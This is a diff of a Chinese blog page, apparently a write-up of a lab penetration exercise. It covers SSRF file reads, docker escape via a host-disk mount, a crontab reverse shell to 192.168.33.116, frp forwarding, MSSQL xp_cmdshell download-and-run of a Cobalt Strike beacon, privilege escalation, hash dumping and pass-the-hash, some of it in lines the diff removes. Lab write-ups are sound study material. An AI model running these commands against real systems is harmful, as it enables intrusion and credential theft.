@@ -10,12 +10,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
     
     <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
-    <meta name="description" content="前言师兄搭建的一个学习环境，从SSRF到docker逃逸再到mssql和PTH移动，记录一下WP 外网跳板http:&#x2F;&#x2F;192.168.34.244&#x2F;  不能用http，能用file，但是过滤了www等，看不了index.php，可以用url编码绕过还可以用 &#x2F;proc&#x2F;self&#x2F;cwd Linux proc &#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系">
+    <meta name="description" content="外网跳板http:&#x2F;&#x2F;192.168.34.244&#x2F;  不能用http，能用file，但是过滤了www等，看不了index.php，可以用url编码绕过还可以用&#x2F;proc&#x2F;self&#x2F;cwd Linux proc &#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一次内网渗透测试">
 <meta property="og:url" content="https://0xr1ngs.github.io/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="前言师兄搭建的一个学习环境，从SSRF到docker逃逸再到mssql和PTH移动，记录一下WP 外网跳板http:&#x2F;&#x2F;192.168.34.244&#x2F;  不能用http，能用file，但是过滤了www等，看不了index.php，可以用url编码绕过还可以用 &#x2F;proc&#x2F;self&#x2F;cwd Linux proc &#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系">
+<meta property="og:description" content="外网跳板http:&#x2F;&#x2F;192.168.34.244&#x2F;  不能用http，能用file，但是过滤了www等，看不了index.php，可以用url编码绕过还可以用&#x2F;proc&#x2F;self&#x2F;cwd Linux proc &#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://0xr1ngs.github.io/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1.png">
 <meta property="og:image" content="https://0xr1ngs.github.io/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/2.png">
@@ -25,9 +25,8 @@
 <meta property="og:image" content="https://0xr1ngs.github.io/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.png">
 <meta property="og:image" content="https://0xr1ngs.github.io/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/7.png">
 <meta property="og:image" content="https://0xr1ngs.github.io/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/8.png">
-<meta property="og:image" content="https://0xr1ngs.github.io/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/9.png">
 <meta property="article:published_time" content="2022-07-16T12:02:14.000Z">
-<meta property="article:modified_time" content="2023-07-10T09:14:54.112Z">
+<meta property="article:modified_time" content="2023-09-20T15:44:06.167Z">
 <meta property="article:author" content="r1ngs">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
@@ -37,13 +36,13 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1689950583493">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1695315378810">
     
-    <link rel="stylesheet" href="/css/style.css?v=1689950583493">
+    <link rel="stylesheet" href="/css/style.css?v=1695315378811">
 
     
         
-            <link rel="stylesheet" href="/custom.css?v=1689950583493">
+            <link rel="stylesheet" href="/custom.css?v=1695315378811">
         
     
 
@@ -52,7 +51,7 @@
 <script src="/lib/fancybox/fancybox.umd.js" async></script>
 
 
-    <script async src="/js/app.js?v=1689950583493"></script>
+    <script async src="/js/app.js?v=1695315378811"></script>
     
      
 
@@ -72,7 +71,7 @@
 <body class="mdui-drawer-body-left">
     <div id="nexmoe-background">
         <div class="nexmoe-bg" 
-            style="background-image: url(https://api.biuioi.com/random-picture/index.php)"
+            style="background-image: url(/images/7.jpg)"
         ></div>
         <div class="mdui-appbar mdui-shadow-0">
             <div class="mdui-toolbar">
@@ -91,8 +90,8 @@
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>Articles</span>10</div>
-        <div><span>Tags</span>8</div>
+        <div><span>Articles</span>15</div>
+        <div><span>Tags</span>9</div>
         <div><span>Categories</span>3</div>
     </div>
     <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
@@ -174,14 +173,14 @@
 
         <li class="category-list-item">
           <a class="category-list-link" href="/categories/Crypto/">Crypto</a>
-          <span class="category-list-count">2</span>
+          <span class="category-list-count">5</span>
         </li>
 
         
 
         <li class="category-list-item">
           <a class="category-list-link" href="/categories/Web/">Web</a>
-          <span class="category-list-count">7</span>
+          <span class="category-list-count">9</span>
         </li>
 
         
@@ -196,12 +195,12 @@
             
   <div class="nexmoe-widget-wrap">
     <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
-      <a href="/tags/Java/" style="font-size: 20px;">Java</a> <a href="/tags/cbc/" style="font-size: 10px;">cbc</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/sqli/" style="font-size: 20px;">sqli</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a>
+      <a href="/tags/Java/" style="font-size: 20px;">Java</a> <a href="/tags/cbc/" style="font-size: 10px;">cbc</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/sqli/" style="font-size: 20px;">sqli</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" style="font-size: 20px;">未授权访问</a>
     </div>
     
       <script>
         var maxTagcloud = parseInt(17);
-        var tags_length = parseInt(8);
+        var tags_length = parseInt(9);
         var tags_arr = [];
         for(var i = 0; i < tags_length; i++){
           tags_arr.push(i);
@@ -223,7 +222,7 @@
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">Archive</h3>
     <div class="nexmoe-widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">6</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">6</span></li></ul>
     </div>
   </div>
 
@@ -246,15 +245,15 @@
           </li>
         
           <li>
-            <a href="/2019/05/31/java-random/">Java Random方法的安全问题</a>
+            <a href="/2019/12/12/redis/">redis未授权访问</a>
           </li>
         
           <li>
-            <a href="/2019/03/28/cbc-bit-flip/">对字节反转攻击的深入研究</a>
+            <a href="/2019/12/12/php-fpm/">php-fpm</a>
           </li>
         
           <li>
-            <a href="/2018/08/21/xss/">xss总结</a>
+            <a href="/2019/11/15/%E8%A7%A3n%E6%AC%A1%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B/">解n次同余方程</a>
           </li>
         
       </ul>
@@ -276,8 +275,8 @@
     <div class="nexmoe-post">
   <article>
     
-        <div class="nexmoe-post-cover"> 
-            <img src="https://api.biuioi.com/random-picture/index.php" alt="一次内网渗透测试" loading="lazy">
+        <div class="nexmoe-post-cover absolute" style="padding-top: 31.575123152709356%;"> 
+            <img src="/2022/07/16/LGP-内网渗透/6.png" alt="一次内网渗透测试" loading="lazy">
             <h1>一次内网渗透测试</h1>
         </div>
     
@@ -297,39 +296,38 @@
     
 </div>
 
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>师兄搭建的一个学习环境，从SSRF到docker逃逸再到mssql和PTH移动，记录一下WP</p>
-<h1 id="外网跳板"><a href="#外网跳板" class="headerlink" title="外网跳板"></a>外网跳板</h1><p><a target="_blank" rel="noopener" href="http://192.168.34.244/">http://192.168.34.244/</a></p>
+    <h1 id="外网跳板"><a href="#外网跳板" class="headerlink" title="外网跳板"></a>外网跳板</h1><p><a target="_blank" rel="noopener" href="http://192.168.34.244/">http://192.168.34.244/</a></p>
 <p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/1.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
-<p>不能用http，能用file，但是过滤了www等，看不了index.php，可以用url编码绕过还可以用 <code>/proc/self/cwd</code></p>
+<p>不能用http，能用file，但是过滤了www等，看不了index.php，可以用url编码绕过还可以用<code>/proc/self/cwd</code></p>
 <h3 id="Linux-proc"><a href="#Linux-proc" class="headerlink" title="Linux proc"></a>Linux proc</h3><blockquote>
 <p>&#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p>
 </blockquote>
-<p><code>/proc/self/cwd</code>是一个软连接，指向用户目录，如果是web用户就指向web目录，也可以用来绕过，还比如 <code>/proc/net/arp</code></p>
+<p><code>/proc/self/cwd</code>是一个软连接，指向用户目录，如果是web用户就指向web目录，也可以用来绕过，还比如<code>/proc/net/arp</code></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute/archive/2011/04/20/2022280.html">深入理解linux系统下proc文件系统内容 - zhezhelin - 博客园</a></p>
 <p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/2.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
-<p>可以看 <code>/etc/hosts</code></p>
+<p>可以看<code>/etc/hosts</code></p>
 <p>这台的ip是172.17.0.2，arp还能看到一个.0.1</p>
-<p>web目录留了一个phpshell和root密码，可以直接查找匹配&#x2F;etc文件夹下的所有文件 <code>grep -rn &quot;root&quot; *</code></p>
-<p>在蚁剑的shell里面不能 <code>su root</code>,这样没法输密码，直接就会返回 <code>Password: su: Authentication failure</code></p>
-<p>可以弹一个 <code>meterpreter</code>，在 <code>meterpreter</code>里进入shell，然后用 <code>su root</code>，然后再以root权限执行 <code>shell.elf</code>,这样就可以获得一个root的 <code>meterpreter</code></p>
+<p>web目录留了一个phpshell和root密码，可以直接查找匹配&#x2F;etc文件夹下的所有文件<code>grep -rn &quot;root&quot; *</code></p>
+<p>在蚁剑的shell里面不能<code>su root</code>,这样没法输密码，直接就会返回<code>Password: su: Authentication failure</code></p>
+<p>可以弹一个<code>meterpreter</code>，在<code>meterpreter</code>里进入shell，然后用<code>su root</code>，然后再以root权限执行<code>shell.elf</code>,这样就可以获得一个root的<code>meterpreter</code></p>
 <h2 id="docker-逃逸"><a href="#docker-逃逸" class="headerlink" title="docker 逃逸"></a>docker 逃逸</h2><p>特权模式挂载用户目录</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">fdisk</span> -l
 <span class="token function">mkdir</span> /test
 <span class="token function">mount</span> /dev/sda1 /test
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>这样相当于把宿主机的根目录挂载到了 <code>/test</code> 可以通过 <code>test</code>进行文件读写。</p>
-<p>但是不能直接去 <code>test</code>目录执行 <code>/bin/bash</code> 只能通过写入 <code>ssh key</code>或者 <code>crontab</code>的形式</p>
+<p>这样相当于把宿主机的根目录挂载到了<code>/test</code> 可以通过<code>test</code>进行文件读写。</p>
+<p>但是不能直接去<code>test</code>目录执行<code>/bin/bash</code> 只能通过写入<code>ssh key</code>或者<code>crontab</code>的形式</p>
 <p>但是注意，不能直接把反弹shell的命令写到任务里，而是应该写入一个sh文件</p>
 <pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * /bin/bash -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.33.116/12501 0<span class="token operator">></span><span class="token operator">&amp;</span>1 ❌
 */1 * * * * root <span class="token function">bash</span> /tmp/shell.sh ✅
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>原因：</p>
 <p><a target="_blank" rel="noopener" href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">解决ubuntu crontab反弹shell失败的问题</a></p>
-<p>简单来说就是 <code>centos</code>里面的 <code>cron</code>中执行的 <code>shell</code>环境是 <code>/bin/sh</code>，<code>ubuntu</code>中 <code>/bin/sh</code>这个软连接指向了 <code>dash</code> 。但是不执行 <code>dash</code>直接执行 <code>/test/bin/bash</code>也是不行的。因为没有用 <code>chroot</code>切换 <code>/test</code>为根目录，而且弹过来的也不是宿主机的 <code>shell</code>，因为这样相当于在原来基础上只是加了一个 <code>/bin/bash</code>而已</p>
+<p>简单来说就是<code>centos</code>里面的<code>cron</code>中执行的<code>shell</code>环境是<code>/bin/sh</code>，<code>ubuntu</code>中<code>/bin/sh</code>这个软连接指向了<code>dash</code> 。但是不执行<code>dash</code>直接执行<code>/test/bin/bash</code>也是不行的。因为没有用<code>chroot</code>切换<code>/test</code>为根目录，而且弹过来的也不是宿主机的<code>shell</code>，因为这样相当于在原来基础上只是加了一个<code>/bin/bash</code>而已。</p>
 <p>同时，如果前面的crontab任务有错，后面的应该也是不执行的，比如前一句忘了写执行的用户</p>
 <p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/3.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
-<h3 id="etc-crontab-和-var-spool-cron区别："><a href="#etc-crontab-和-var-spool-cron区别：" class="headerlink" title="/etc/crontab 和 /var/spool/cron区别："></a><code>/etc/crontab</code> 和 <code>/var/spool/cron</code>区别：</h3><p><code>/var/spool/cron/</code>这个目录是以账号来区分每个用户自己的执行计划，而 <code>/etc/crontab</code>系统执行计划，需要在五个*后面加上用户，比如上面没有写到 <code>/etc/crontab</code>没有加root就是错误的</p>
-<p>然后现在通过反弹的shell再弹 <code>meterpreter</code>就有宿主机shell了</p>
+<h3 id="etc-crontab-和-var-spool-cron区别："><a href="#etc-crontab-和-var-spool-cron区别：" class="headerlink" title="/etc/crontab 和 /var/spool/cron区别："></a><code>/etc/crontab</code> 和 <code>/var/spool/cron</code>区别：</h3><p><code>/var/spool/cron/</code>这个目录是以账号来区分每个用户自己的执行计划，而<code>/etc/crontab</code>系统执行计划，需要在五个*后面加上用户，比如上面没有写到<code>/etc/crontab</code>没有加root就是错误的</p>
+<p>然后现在通过反弹的shell再弹<code>meterpreter</code>就有宿主机shell了</p>
 <h1 id="内网移动"><a href="#内网移动" class="headerlink" title="内网移动"></a>内网移动</h1><h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetInfo:
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span>172.16.2.4
    <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>MSSQL
@@ -345,9 +343,9 @@
 <span class="token punctuation">[</span>+<span class="token punctuation">]</span> 172.16.2.1	MS17-010	<span class="token punctuation">(</span>Windows Server 2012 R2 Datacenter 9600<span class="token punctuation">)</span>
 <span class="token punctuation">[</span>+<span class="token punctuation">]</span> 172.16.2.2	MS17-010	<span class="token punctuation">(</span>Windows 7 Professional 7601 Service Pack 1<span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>不拿17-010打了，打 <code>mssql</code> ，密码在web配置文件里有，但是这台mssql只连通 <code>172.16.2.0</code>网段，要反弹回来的话只能在跳板机做一个端口转发，跳板机做server，攻击机做client，payload反弹到server的 <code>12001</code>端口相当于反弹到了client的 <code>12001</code>端口，<code>listener</code>这样设置</p>
+<p>不拿17-010打了，打<code>mssql</code> ，密码在web配置文件里有，但是这台mssql只连通<code>172.16.2.0</code>网段，要反弹回来的话只能在跳板机做一个端口转发，跳板机做server，攻击机做client，payload反弹到server的<code>12001</code>端口相当于反弹到了client的<code>12001</code>端口，<code>listener</code>这样设置</p>
 <p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/4.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
-<p><code>172.16.2.12</code>就是跳板机的一个网卡ip，攻击机的 <code>frpc.ini</code> 配置为</p>
+<p><code>172.16.2.12</code>就是跳板机的一个网卡ip，另一个是192.168.34.244。攻击机的<code>frpc.ini</code> 配置为</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
 tls_enable <span class="token operator">=</span> <span class="token boolean">true</span>
 token <span class="token operator">=</span> qax_scu
@@ -364,98 +362,20 @@ local_ip <span class="token operator">=</span>127.0.0.1
 <p>然后不能用cs直接通过listener生成payload，然后mssql_exec执行，因为经过排查后发现这样生成的payload根本没有走http流量，可能是个cs的bug，所以只能生成exe文件然后下载执行。</p>
 <p><strong>其次，msf的mssql_exec模块如果返回有中文字符会直接报错，建议直接用navicat</strong></p>
 <p>跳板机有python3，起一个http.server就可以，然后下载到progamdata执行</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">exec</span> master<span class="token punctuation">..</span>xp_cmdshell <span class="token string">"powershell Invoke-WebRequest &lt;http://172.16.2.12:12345/beacon.exe> -OutFile C://programdata/beacon.exe"</span>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">exec</span> master<span class="token punctuation">..</span>xp_cmdshell <span class="token string">"powershell Invoke-WebRequest http://172.16.2.12:12345/beacon.exe -OutFile C://programdata/beacon.exe"</span>
 <span class="token function">exec</span> master<span class="token punctuation">..</span>xp_cmdshell <span class="token string">"C://programdata/beacon.exe"</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>mssql是 <code>nt/service</code>权限，用 <code>ms16-075</code>一键提权，弹回新的shell，然后hashdump和mimikatz</p>
-<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/5.png" alt="截屏2022-07-06 15.59.55.png" data-caption="截屏2022-07-06 15.59.55.png" loading="lazy"></p>
-<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><blockquote>
-<p>安全账户管理器（SAM）是Windows XP、Windows Vista、Windows 7、8.1、10和11中的一个数据库文件，用于存储用户的密码。它可以用来验证本地和远程用户。从Windows 2000 SP4开始，活动目录（AD）对域用户的尝试登陆进行认证。SAM使用加密措施来防止未经认证的用户访问系统。</p>
-</blockquote>
-<blockquote>
-<p>SAM数据库文件存储在C:\Windows\System32\config中。该文件中的所有数据都是加密的。密码哈希值存储在HKEY_LOCAL_MACHINE&#x2F;SAM中。即使它存储在本地，任何系统用户在运行时都不能访问该文件。出于安全考虑，对SAM的访问有不同的权限。访问它需要HKLM&#x2F;SAM和SYSTEM的权限。</p>
-</blockquote>
-<blockquote>
-<p>hashdump是pwdump工具的内存版本，但它不是将DLL加载到LSASS.exe，而是在进程中分配内存，注入原始汇编代码，通过CreateRemoteThread执行，然后从内存中读回捕获的哈希值。</p>
-</blockquote>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>mssql是<code>nt/service</code>权限，用<code>ms16-075</code>一键提权，弹回新的shell，然后hashdump和mimikatz</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/5.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
 <p>hashdump返回的结果格式为：</p>
 <p><code>Username:RID:LM-HASH:NTLM-HASH</code></p>
 <p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">cmd5</a>支持NTLM解密</p>
-<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><blockquote>
-<p>Mimikatz是一个开源的应用程序，允许用户查看和保存认证凭证，如Kerberos门票。</p>
-</blockquote>
-<blockquote>
-<p>本地安全授权服务器服务（LSASS）是微软Windows操作系统中的一个进程，负责执行系统的安全策略。它验证登录到Windows计算机或服务器的用户，处理密码变更，并创建访问令牌。 它还会向Windows安全日志写入内容。</p>
-</blockquote>
-<blockquote>
-<p>Windows使用的lsass.exe文件位于%WINDIR%\System32目录下，该文件的描述是本地安全授权进程。强行终止lsass.exe会导致系统失去对任何账户的访问权，包括NT AUTHORITY，促使机器重新启动。</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/68903144">深入分析Mimikatz：WDigest</a></p>
-<p>大概原理就是将任意DLL载入LSASS</p>
-<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>一台windows计算机要么属于一个工作组，要么属于一个域。工作组中的每一台计算机在网络中地位平等，是独立管理的个体。域的优点在于1）集中的统一账户、资源管理。2）工作站的有效配置和安全性严密控制（比如给所有机器统一发放补丁等）。当计算机数量比较多，大型企业中网络规模大，需要统一的管理和集中的身份验证，并且能够给用户提供方便的搜索和使用网络资源的方式就应该使用域。域用户信息保存在活动目录(AD)中。</p>
-<blockquote>
-<p>域是Windows计算机网络的一种形式，其中所有用户帐户 、计算机、打印机和其他安全主体都在位于称为域控制器（DC）的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行， 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配相应的该域内资源的访问权限。 从Windows Server 2003开始 ， Active Directory是负责维护该中央数据库的Windows组件。</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/174748699">内网渗透入门–域相关概念</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cnjavahome/p/9029665.html">AD 域服务简介（一）- 基于 LDAP 的 AD 域服务器搭建及其使用</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8117#toc-2">浅探内网横向移动-Pass The Hash - 先知社区</a></p>
-<blockquote>
-<p>自window vista之后没办法使用RID非500的本地管理员用户来进行Pass The Hash, 但是如果是域用户且该域用户属于本地Administrators组的成员也可以进行pass the hash</p>
-</blockquote>
-<pre class="line-numbers language-bash"><code class="language-bash">shell net user /domain
-\\\\DC.outx.com 的用户帐户
-
--------------------------------------------------------------------------------
-Administrator            Guest                    krbtgt                 
-outx                   
-命令成功完成。
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>其中，KRBTGT账户是一个本地默认账户，作为密钥分发中心（KDC）服务的一个服务账户。这个账户不能被删除，账户名称也不能被改变。KRBTGT账户不能在活动目录中启用。在创建域的时候会自动创建这个账户。</p>
-<h3 id="IPC-及利用"><a href="#IPC-及利用" class="headerlink" title="IPC$及利用"></a>IPC$及利用</h3><pre class="line-numbers language-bash"><code class="language-bash">beacon<span class="token operator">></span> net share
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Tasked beacon to run net share on localhost
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> host called home, sent: 105058 bytes
-<span class="token punctuation">[</span>+<span class="token punctuation">]</span> received output:
-Shares at \\\\localhost:
-
- Share name                       Comment
- ----------                       -------
- ADMIN$                           远程管理
- C$                               默认共享
- IPC$                             远程 IPC
-
-pth .\\outx ecde4d7a314541d34854ec83c114634b
-
-shell <span class="token function">dir</span> \\\\dc\\c$
-
-<span class="token comment" spellcheck="true">#当访问softer计算机中名为it168的共享文件夹，用UNC表示就是\\\\softer\\it168；</span>
-<span class="token comment" spellcheck="true">#如果是softer计算机的默认管理共享C$则用\\\\softer\\c$来表示。</span>
-<span class="token comment" spellcheck="true">#如果继续：</span>
-shell <span class="token function">dir</span> \\\\dc\\c$\\Users
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<blockquote>
-<p>IPC$共享是由Windows服务器服务创建的。这个特殊共享的存在是为了允许后续的<strong>命名管道</strong>连接到服务器。服务器的<strong>命名管道</strong>是由内置的操作系统组件和安装在系统上的任何应用程序或服务创建的。当命名管道被创建时，该进程指定了与该管道相关的安全性。然后，它确保 <strong>只向指定的用户或组授予访问权</strong> 。</p>
-</blockquote>
-<blockquote>
-<p>IPC$共享也被称为空会话连接。通过使用该会话，Windows允许匿名用户执行某些活动，如列举域账户和网络共享的名称。</p>
-</blockquote>
-<blockquote>
-<p>net use：将一台计算机连接到共享资源，或将一台计算机从共享资源中断开，或显示有关计算机连接的信息。</p>
-</blockquote>
-<pre class="line-numbers language-bash"><code class="language-bash">net use \\\\靶机ip地址\\ipc$ <span class="token string">"密码"</span> /user:<span class="token string">"用户名"</span>
-net use
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
-<p>然后可以通过这个链接上传文件等等，比如 <code>copy user.bat \\\\192.168.1.108\\c$</code></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/7401609.html">IPC$入侵大全</a></p>
+<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>window vista之后没办法使用RID非500的本地管理员用户来进行Pass The Hash, 但是如果是域用户且该域用户属于本地Administrators组的成员也可以进行pass the hash</p>
 <h3 id="CS攻击"><a href="#CS攻击" class="headerlink" title="CS攻击"></a>CS攻击</h3><p>在cs里，视图⇒目标⇒添加目标，添加DC，输入ip地址，然后psexec</p>
-<blockquote>
-<p>PsExec是一个轻量级的telnet替代软件，可以让你在其他系统上执行程序，为控制台应用程序提供完整的交互性，而不需要手动安装客户端软件。PsExec最强大的用途包括在远程系统上启动交互式命令程序和远程启用工具，如IpConfig，否则就不能显示远程系统的信息。</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1752180">横向移动 - PsExec 的使用</a></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
 <p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/7.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
-<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/8.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
 <p>直接就上线了，PC机也可以这么做</p>
-<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/9.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/8.png" alt="Untitled" data-caption="Untitled" loading="lazy"></p>
 
     
   </article>
@@ -473,7 +393,7 @@ net use
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1689950583469"></script>
+    <script async src="/js/copy-codeblock.js?v=1695315378772"></script>
   
 
   
@@ -494,7 +414,7 @@ net use
                               <button class="mdui-fab catalog" style="overflow:unset;">
                                   <i class="nexmoefont icon-i-catalog"></i>
                                   <div class="nexmoe-toc">
